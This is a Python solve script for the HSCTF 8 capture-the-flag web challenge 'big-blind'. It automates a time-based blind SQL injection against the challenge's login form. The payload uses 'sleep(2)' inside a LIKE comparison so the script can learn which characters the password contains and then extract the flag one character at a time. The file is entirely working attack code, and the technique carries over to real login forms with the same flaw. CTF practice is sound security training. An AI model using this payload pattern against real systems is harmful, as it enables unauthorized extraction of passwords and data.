# HSCTF 8
# web: big-blind
# woanmeo11

import requests
from string import ascii_lowercase

url = 'https://big-blind.hsc.tf'

charset = ''
flag = 'flag{'

temple = "admin' and if (pass like binary '{}',sleep(2),1)#"

for c in ascii_lowercase + '_{}':
    payload = temple.format('%' + c + '%')
    r = requests.post(url, data={'user': payload, 'pass': ''})
    print(c, r.elapsed.seconds)
    if r.elapsed.seconds > 2:
        charset += c

print('charset: ', charset)

found = False
while not found:
    found = True
    for c in charset:
        payload = temple.format(flag + c + '%')
        r = requests.post(url, data={'user': payload, 'pass': ''})
        print(c, r.elapsed.seconds)
        if r.elapsed.seconds > 2:
            flag += c
            print(flag)
            found = False
            break

print(flag)
